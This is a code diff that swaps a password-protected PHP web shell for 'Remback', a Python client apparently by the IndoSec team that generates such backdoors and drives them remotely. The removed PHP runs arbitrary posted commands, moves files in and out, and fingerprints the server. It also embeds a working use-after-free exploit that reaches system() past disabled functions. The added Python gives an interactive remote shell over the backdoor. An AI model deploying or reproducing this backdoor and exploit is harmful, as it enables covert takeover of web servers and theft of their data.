@@ -1,377 +1,266 @@
-<?php
+# -*- coding: utf-8 -*-
 
-error_reporting(0);
+from colorama import init, Fore, Back, Style
+from prettytable import PrettyTable
+from requests import post
+from time import sleep
+import os
+import re
+import sys
+import json
 
-$password = "12345";
-$get_password = $_POST["password"];
-$cmd = $_POST["cmd"];
-$aksi = $_POST["aksi"];
 
-function exe($cmd){
-    if(function_exists('system')){
-        @ob_start();
-        @system($cmd);
-        $buff = @ob_get_contents();
-        @ob_end_clean();
-        return $buff;
-    }elseif(function_exists('exec')){
-        @exec($cmd,$results);
-        $buff = "";
-        foreach($results as $result){
-            $buff .= $result;
-        } return $buff;
-    }elseif(function_exists('passthru')){
-        @ob_start();
-        @passthru($cmd);
-        $buff = @ob_get_contents();
-        @ob_end_clean();
-        return $buff;
-    }elseif(function_exists('shell_exec')){
-        $buff = @shell_exec($cmd);
-        return $buff;
-    }
-}
+init(autoreset=True) #autoreset colorama
 
-function pwn($cmd) {
-    global $abc, $helper;
+reload(sys)
+sys.setdefaultencoding('utf8')
 
-    function str2ptr(&$str, $p = 0, $s = 8) {
-        $address = 0;
-        for($j = $s-1; $j >= 0; $j--) {
-            $address <<= 8;
-            $address |= ord($str[$p+$j]);
-        }
-        return $address;
-    }
 
-    function ptr2str($ptr, $m = 8) {
-        $out = "";
-        for ($i=0; $i < $m; $i++) {
-            $out .= chr($ptr & 0xff);
-            $ptr >>= 8;
-        }
-        return $out;
-    }
+def cls():
+    os.system('cls' if os.name=='nt' else 'clear')
+     
+def banner():
+    print("""
+         \033[91m`:+syhhys+:`          \033[92m ______ _______ _______  _____  _______ _______
+       \033[91m-yNMMMMMMMMMMMh:        \033[92m|_____/ |______ |  |  | |     |    |    |______
+      \033[91m/MMMMMMMMMMMMMMMM+       \033[92m|    \_ |______ |  |  | |_____|    |    |______
+      \033[91mNhMMMMMMMMMMMMMMyN`      \033[97m                                        \t\tBeta V.0.1
+      \033[91mm+NMMMMMMMMMMMMM/N       \033[92m______  _______ _______ _     _ ______   _____   _____   ______
+      \033[91m:omy+/:+MM+:/+yN+/       \033[92m|_____] |_____| |       |____/  |     \ |     | |     | |_____/
+  \033[91m:-   -M-  `/NN/`  :M.   --   \033[92m|_____] |     | |_____  |    \_ |_____/ |_____| |_____| |    \_\033[0m
+ \033[91m.mN.  :NNysmM++NmssNN-  .Nm.  \033[92m---------------------------------------------------------------
+\033[91m.yyhyys///+yMd+odMh+///syhhyy. \033[97mAuthor : Rizsyad AR ft Fauzan W                     \033[0m
+ \033[91m`  `.-+s-o/syyyys/s:s+:.`  `  \033[97mTeam   : { IndoSec }                                \033[0m
+          \033[91ms-      :y           \033[97mWe not responsible for damage caused by Remback.    \033[0m
+  \033[91m`/:-/ohy+mhyssyhm+sho/-:/`   \033[97mAttacking targets without mutual consent is illegal!\033[0m
+   \033[91m+mNy+-` ./osso/. `-+yNm+   
+    \033[91ms/                  +s\033[0m 
+    """)
 
-    function write(&$str, $p, $v, $n = 8) {
-        $i = 0;
-        for($i = 0; $i < $n; $i++) {
-            $str[$p + $i] = chr($v & 0xff);
-            $v >>= 8;
-        }
-    }
+def help():
+    print( Fore.WHITE + "\n[" + Fore.RED + "+" + Fore.WHITE + "] " + Fore.WHITE + "Command: ")
 
-    function leak($addr, $p = 0, $s = 8) {
-        global $abc, $helper;
-        write($abc, 0x68, $addr + $p - 0x10);
-        $leak = strlen($helper->a);
-        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
-        return $leak;
-    }
+    print( Fore.WHITE + "└[" + Fore.GREEN + "•" + Fore.WHITE + "] " + Fore.WHITE + "Info\t\t\t: information gathering")
+    print( Fore.WHITE + "└[" + Fore.GREEN + "•" + Fore.WHITE + "] " + Fore.WHITE + "download <file>\t\t: download file ")
+    print( Fore.WHITE + "└[" + Fore.GREEN + "•" + Fore.WHITE + "] " + Fore.WHITE + "upload <path/file>\t\t: download file ")
+    print( Fore.WHITE + "└[" + Fore.GREEN + "•" + Fore.WHITE + "] " + Fore.WHITE + "cd <dir>\t\t\t: change directory ")
 
-    function parse_elf($base) {
-        $e_type = leak($base, 0x10, 2);
 
-        $e_phoff = leak($base, 0x20);
-        $e_phentsize = leak($base, 0x36, 2);
-        $e_phnum = leak($base, 0x38, 2);
+def fiturcd(cmd, getdir):
+    getcmd = re.match(r'cd (.*)', cmd, re.M|re.I)
+    newdir1 = ""
 
-        for($i = 0; $i < $e_phnum; $i++) {
-            $header = $base + $e_phoff + $i * $e_phentsize;
-            $p_type  = leak($header, 0, 4);
-            $p_flags = leak($header, 4, 4);
-            $p_vaddr = leak($header, 0x10);
-            $p_memsz = leak($header, 0x28);
+    if getcmd:
+        if getcmd.group(1) == "..":
+            for i in getdir.split('/')[:-1]:
+                newdir1 += i + "/"
 
-            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
-                # handle pie
-                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
-                $data_size = $p_memsz;
-            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
-                $text_size = $p_memsz;
-            }
-        }
+            result = newdir1
 
-        if(!$data_addr || !$text_size || !$data_size)
-            return false;
+            return result
 
-        return [$data_addr, $text_size, $data_size];
-    }
+        else:
+            for i in getdir.split('/'):
+                newdir1 += i + "/" 
+            
+            result = newdir1 + getcmd.group(1)
 
-    function get_basic_funcs($base, $elf) {
-        list($data_addr, $text_size, $data_size) = $elf;
-        for($i = 0; $i < $data_size / 8; $i++) {
-            $leak = leak($data_addr, $i * 8);
-            if($leak - $base > 0 && $leak - $base < $text_size) {
-                $deref = leak($leak);
-                # 'constant' constant check
-                if($deref != 0x746e6174736e6f63)
-                    continue;
-            } else continue;
-
-            $leak = leak($data_addr, ($i + 4) * 8);
-            if($leak - $base > 0 && $leak - $base < $text_size) {
-                $deref = leak($leak);
-                # 'bin2hex' constant check
-                if($deref != 0x786568326e6962)
-                    continue;
-            } else continue;
-
-            return $data_addr + $i * 8;
-        }
-    }
-
-    function get_binary_base($binary_leak) {
-        $base = 0;
-        $start = $binary_leak & 0xfffffffffffff000;
-        for($i = 0; $i < 0x1000; $i++) {
-            $addr = $start - 0x1000 * $i;
-            $leak = leak($addr, 0, 7);
-            if($leak == 0x10102464c457f) { # ELF header
-                return $addr;
-            }
-        }
-    }
-
-    function get_system($basic_funcs) {
-        $addr = $basic_funcs;
-        do {
-            $f_entry = leak($addr);
-            $f_name = leak($f_entry, 0, 6);
-
-            if($f_name == 0x6d6574737973) { # system
-                return leak($addr + 8);
-            }
-            $addr += 0x20;
-        } while($f_entry != 0);
-        return false;
-    }
-
-    class ryat {
-        var $ryat;
-        var $chtg;
+            return result
+    else:
+        return False
         
-        function __destruct()
-        {
-            $this->chtg = $this->ryat;
-            $this->ryat = 1;
-        }
-    }
-
-    class Helper {
-        public $a, $b, $c, $d;
-    }
-
-    if(stristr(PHP_OS, 'WIN')) {
-        die('This PoC is for *nix systems only.');
-    }
-
-    $n_alloc = 10; # increase this value if you get segfaults
-
-    $contiguous = [];
-    for($i = 0; $i < $n_alloc; $i++)
-        $contiguous[] = str_repeat('A', 79);
-
-    $poc = 'a:4:{i:0;i:1;i:1;a:1:{i:0;O:4:"ryat":2:{s:4:"ryat";R:3;s:4:"chtg";i:2;}}i:1;i:3;i:2;R:5;}';
-    $out = unserialize($poc);
-    gc_collect_cycles();
-
-    $v = [];
-    $v[0] = ptr2str(0, 79);
-    unset($v);
-    $abc = $out[2][0];
-
-    $helper = new Helper;
-    $helper->b = function ($x) { };
-
-    if(strlen($abc) == 79) {
-        die("UAF failed");
-    }
-
-    # leaks
-    $closure_handlers = str2ptr($abc, 0);
-    $php_heap = str2ptr($abc, 0x58);
-    $abc_addr = $php_heap - 0xc8;
-
-    # fake value
-    write($abc, 0x60, 2);
-    write($abc, 0x70, 6);
-
-    # fake reference
-    write($abc, 0x10, $abc_addr + 0x60);
-    write($abc, 0x18, 0xa);
-
-    $closure_obj = str2ptr($abc, 0x20);
-
-    $binary_leak = leak($closure_handlers, 8);
-    if(!($base = get_binary_base($binary_leak))) {
-        die("Couldn't determine binary base address");
-    }
-
-    if(!($elf = parse_elf($base))) {
-        die("Couldn't parse ELF header");
-    }
-
-    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
-        die("Couldn't get basic_functions address");
-    }
-
-    if(!($zif_system = get_system($basic_funcs))) {
-        die("Couldn't get zif_system address");
-    }
-
-    # fake closure object
-    $fake_obj_offset = 0xd0;
-    for($i = 0; $i < 0x110; $i += 8) {
-        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
-    }
-
-    # pwn
-    write($abc, 0x20, $abc_addr + $fake_obj_offset);
-    write($abc, 0xd0 + 0x38, 1, 4); # internal func type
-    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler
-
-    ($helper->b)($cmd);
-
-    exit();
-}
-
-
-if($password === $get_password)
-{ 
-  if(isset($cmd))
-  {
-	if(isset($_POST['dir']))
-	{
-		$dir = $_POST['dir'];
-		chdir($dir);
-	} 
-	else
-	{
-		$dir = getcwd();
-    }
+def fiturdownload(cmd, getdir):
+    getfile = re.match(r'download (.*)', cmd, re.M|re.I)
     
-    if($aksi == "info")
-    {
-        header('Content-Type: text/plain');
+    if getfile:
+        result = getdir + "/" + getfile.group(1)
+        return result
+    else:
+        return False
+
+def fiturupload(cmd, getdir):
+    getfile = re.match(r'upload (.*)', cmd, re.M|re.I)
+    
+    if getfile:
+        result = getfile.group(1)
+        return result
+    else:
+        return False
+
+    
+def connect():
+    url = raw_input(Fore.WHITE + "[" + Fore.YELLOW + "?" + Fore.WHITE + "] " + Fore.WHITE + "Input Backdoor Location: ")
+    password = raw_input(Fore.WHITE + "[" + Fore.YELLOW + "?" + Fore.WHITE + "] " + Fore.WHITE + "Input Backdoor Password: ")
+
+    try:
+        check = post(url, data={"password":password}).text.replace('\n','')
+    except KeyboardInterrupt:
+        print( Fore.WHITE + "\n\n[" + Fore.YELLOW + "!" + Fore.WHITE + "] " + Fore.WHITE + "CTRL+C Detected.....")
+        raise SystemExit
+    except:
+        print(Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "] " + Fore.WHITE + "Error, Check your URL!")
+        exit(0)
+
+    if check == "true":
+    
+        getdir = post(url, data={"password":password,"cmd":"pwd"}).text.replace('\n','')
+
+        sleep(2)
+        print(Fore.WHITE + "[" + Fore.YELLOW + "!" + Fore.WHITE + "] " + Fore.WHITE + "Backdoor Is Live.. Waiting to Connect BackDoor..")
+        sleep(2)
+        print(Fore.WHITE + "[" + Fore.GREEN + "✔" + Fore.WHITE + "] " + Fore.WHITE + "Success, Backdoor Is Connected..\n")
+
+        command = "\033[96m┌[remback\033[93m@\033[91mIndoSec]~[\033[92m"+ getdir +"\033[91m]\n\033[96m└\033[93m#\033[97m "
+        result = ""
         
-        $os = php_uname();
-        $ip = getHostByName(getHostName());
-        $ver = phpversion();
-        $sof = $_SERVER['SERVER_SOFTWARE'];
-        $mail = (function_exists('mail')) ? "ON" : "OFF";
-        $county_name = file_get_contents("https://ipapi.co/".$ip."/country_name");
-        $ds = @ini_get("disable_functions");
-        $show_ds = (!empty($ds)) ? $ds : "NONE";
-        $county_name = ($county_name == "Undefined") ? "Not Found"  : $county_name;
-        
-        if(function_exists('mysql_get_client_info'))
-        {
-            $db = "MySql (".mysql_get_client_info().")";
-        }
-        elseif(function_exists('mssql_connect'))
-        {
-	        $db = "MSSQL";
-        }
-        elseif(function_exists('oci_connect'))
-        {
-	        $db = "Oracle";
-        }
-        elseif(function_exists('pg_connect'))
-        {
-	        $db = "PostgreSQL";
-        }
-        else
-        {
-	        $db = "None";
-        }
+        while True:
+                cmd = raw_input(command).rstrip()
+
+                if cmd == "exit":
+                    break
+                elif cmd == "clear":
+                    cls()
+                    banner()  
+                elif cmd == "info":
+                    result = post(url, data={"password":password,"dir":getdir,"aksi":"info","cmd":""}).text
+                    print(result)
+                elif cmd == "subdo":
+                    result = post(url, data={"password":password,"dir":getdir,"aksi":"show_subdo","cmd":""}).text
+                    print("\n" + result)
+                elif cmd == "show":
+                    result = PrettyTable()
+
+                    result.field_names = ["Name", "Size", "Last Modified", "Owner/Group", "Permission"]
+
+                    result.align['Name'] = 'l'
+
+                    data = {
+                        "password":password,
+                        "dir":getdir,
+                        "aksi":"show_dirfile",
+                        "cmd":""
+                    }
+
+                    r = post(url, data=data).text
+
+                    output = json.loads(r)
+
+                    for folder in output['folder']:
+                        if folder['status'] == 'green':
+                            result.add_row([folder['nama_folder'] + "/",folder['size'],folder['Last_Modified'],folder['og'], Fore.GREEN + folder['Permission'] + Style.RESET_ALL + Fore.WHITE])
+                        else:
+                            result.add_row([folder['nama_folder'] + "/",folder['size'],folder['Last_Modified'],folder['og'], Fore.RED + folder['Permission'] + Style.RESET_ALL + Fore.WHITE])
+
+                    for files in output['file']:
+                        if folder['status'] == 'green':
+                            result.add_row([files['nama_file'],files['size'],files['Last_Modified'],files['og'], Fore.GREEN + files['Permission'] + Style.RESET_ALL + Fore.WHITE])
+                        else:
+                            result.add_row([files['nama_file'],files['size'],files['Last_Modified'],files['og'], Fore.RED + files['Permission'] + Style.RESET_ALL + Fore.WHITE])
+
+                    
+                    print(result)
+                            
+                elif cmd == "command":
+                    help()
 
 
-        echo "\n";
-        echo "PHP Version\t\t: ". $ver . "\n"; 
-        echo "IP Server\t\t: ". $ip . " ( ".$county_name." ) \n";
-        echo "Database\t\t: ".$db."\n";
-        echo "Mailer\t\t\t: ".$mail."\n";
-        echo "Disable Function\t: ".$show_ds."\n";
-        echo "Software\t\t: ". $sof . "\n";
-        echo "Operating system\t: ". $os . "\n";
-       
-    }
-    else if($aksi == "download")
-    {
-        header('Content-Type: text/plain');
-        $file = $_POST["file"];
-        if($cek = file_get_contents($file))
-        {
-            echo $cek;
-        }
-        else
-        {
-            echo "False";
-        }
-    }
-    else if($aksi == "upload")
-    {
-        header('Content-Type: text/plain');
+                if(fiturcd(cmd, getdir) != False):
+                    output = fiturcd(cmd, getdir)
+                    getdir = post(url, data={"password":password,"dir":output,"cmd":"pwd"}).text.replace('\n','')
+                    result = post(url, data={"password":password,"dir":getdir,"cmd":cmd}).text
+                    command = "\033[96m┌[remback\033[93m@\033[91mIndoSec]~[\033[92m"+ getdir +"\033[91m]\n\033[96m└\033[93m#\033[97m "
+                
+                elif(fiturdownload(cmd, getdir) != False):
+                    getname = re.match(r'download (.*)', cmd, re.M|re.I)
+                    output = fiturdownload(cmd, getdir)
+                    savein = raw_input("[?] Save File in: ")
+                    data = {
+                        "password":password,
+                        "dir":getdir,
+                        "cmd":"",
+                        "aksi":"download",
+                        "file":output
+                    }
+                    download = post(url, data=data)  
+                    if download.text != "False":
+                        open(savein + "/" + getname.group(1), 'wb').write(download.content)
+                        result = Fore.WHITE + "[" + Fore.GREEN + "✔" + Fore.WHITE + "] " + Fore.WHITE + "Success, Download File.."              
+                    else:
+                        result = Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "] " + Fore.WHITE + "Error, Download file!"
+                    
+                        
 
-        $dir = $_POST['dir'];
-        $name = $_POST['name'];
-        $context = $_FILES['file']['tmp_name'];
-        $target_file = $dir. '/'.$name;
+                elif(fiturupload(cmd, getdir) != False):
+                    getname = re.match(r'upload (.*)', cmd, re.M|re.I)
+                    filename = getname.group(1).split('/')[-1]
+                    try:
+                        files = open(getname.group(1),"rb")
+                        data = {
+                            "password":password,
+                            "dir":getdir,
+                            "cmd":"",
+                            "aksi":"upload",
+                            "name":filename
+                        }
+                        upload = post(url, data=data, files={"file":files}).text
 
-        if(move_uploaded_file($_FILES["file"]["tmp_name"], $target_file))
-        {
-            echo "success";
-        }
-        else
-        {
-            echo "error";
-        }
+                        if(upload != "error"):
+                            result = Fore.WHITE + "[" + Fore.GREEN + "✔" + Fore.WHITE + "] " + Fore.WHITE + "Success, Upload File.."
+                        else:
+                            result = Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "] " + Fore.WHITE + "Error, Upload file!"
+                        
+                        
+                    except:
+                        print( Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "] " + Fore.WHITE + "Error, Can't open file!")
+                    
+                else:
+                    result = post(url, data={"password":password,"dir":getdir,"cmd":cmd}).text
 
-    }
-    else if($aksi == "show_subdo")
-    {
-        header('Content-Type: text/plain');
+                print("\033[92m"+result + "\033[0m\n")
+    
+    else:
+        print( Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "] " + Fore.WHITE + "Password is Incorrect")
+        exit(0)
 
-        $web = $_SERVER['HTTP_HOST'];
-        $web = str_replace('www.','',$web);
-        
-        // count and scan subdomain by RED_HAWK
-        $urlsd      = "http://api.hackertarget.com/hostsearch/?q=" . $web;
-        $resultsd   = file_get_contents($urlsd);
-        $subdomains = trim($resultsd, "\n");
-        $subdomains = explode("\n", $subdomains);
-        unset($subdomains['0']);
-        $sdcount = count($subdomains);
 
-        echo "[i] Total Subdomains Found : ". $sdcount . "\n\n";
+def generate():
+    backdoor_name   = raw_input(Fore.WHITE + "[" + Fore.YELLOW + "?" + Fore.WHITE + "] " + Fore.WHITE + "Backdoor Name: ")
+    password        = raw_input(Fore.WHITE + "[" + Fore.YELLOW + "?" + Fore.WHITE + "] " + Fore.WHITE + "Password: ")
+    opensample      = open('sample/backdoor.txt', 'r')
+    replacePassword = opensample.read().replace('12345', password)
+    opensample.close()
+    openbackdoor    = open(backdoor_name + '.php', 'w')
+    openbackdoor.write(replacePassword)
+    openbackdoor.close()
 
-        foreach ($subdomains as $subdomain)
-        {
-          echo "[+] Subdomain: " . (str_replace(",", "\n[-] IP: ", $subdomain));
-          echo "\n\n";
-        }
-    }
-    else
-    {
-        $show_ds = (!empty($ds)) ? $ds : "NONE";
-        if($show_ds == "NONE")
-        {
-            echo trim(exe($cmd));
-        }
-        else
-        {
-            trim(pwn($cmd));
-        } 
-    }
-	
-  }
-  else
-  {
-	echo "true";
-  }
-}
-else
-{
-	echo "false";
-}
+    print( Fore.WHITE + "\n[" + Fore.GREEN + "✔" + Fore.WHITE + "] " + Fore.WHITE + "Generating backdoor successfully")
+    print( Fore.WHITE + "└[" + Fore.RED + "•" + Fore.WHITE + "] " + Fore.WHITE + "Backdoor Name\t:" + backdoor_name)
+    print( Fore.WHITE + "└[" + Fore.RED + "•" + Fore.WHITE + "] " + Fore.WHITE + "Backdoor Password\t:" + password)
+    
+try:
+    cls()
+    banner()
+    if sys.platform == "win32":
+        print( Fore.WHITE + "[" + Fore.YELLOW + "!" + Fore.WHITE + "] " + Fore.WHITE + "Sorry, this tool does not work on Windows operating systems")
+    else:
+        print( Fore.WHITE + "[" + Fore.RED + "+" + Fore.WHITE + "] Options :")
+        print( Fore.WHITE + "└[" + Fore.GREEN + "•" + Fore.WHITE + "] " + Fore.RED + "1. " + Fore.WHITE + "Generate Backdoor")
+        print( Fore.WHITE + "└[" + Fore.GREEN + "•" + Fore.WHITE + "] " + Fore.RED + "2. " + Fore.WHITE + "Remote Backdoor")
+        print( Fore.WHITE + "└[" + Fore.GREEN + "•" + Fore.WHITE + "] " + Fore.RED + "3. " + Fore.WHITE + "Bypass Shell Exec (Coming Soon)")
+        action = raw_input("\n\033[96m┌[remback\033[93m@\033[91mIndoSec]~[\033[92mChoose the options\033[91m]\n\033[96m└\033[93m#\033[97m ")
+        if action == "1":
+            cls()
+            banner()
+            generate()
+        elif action == "2":
+            cls()
+            banner()
+            connect()
+        elif action == "3":
+             print( Fore.WHITE + "[" + Fore.YELLOW + "!" + Fore.WHITE + "] " + Fore.WHITE + "Coming Soon")
+        else:
+            print( Fore.WHITE + "[" + Fore.YELLOW + "!" + Fore.WHITE + "] " + Fore.WHITE + "Incorrect options")
+except KeyboardInterrupt:
+    print( Fore.WHITE + "\n\n[" + Fore.YELLOW + "!" + Fore.WHITE + "] " + Fore.WHITE + "CTRL+C Detected.....")
+    raise SystemExit
+
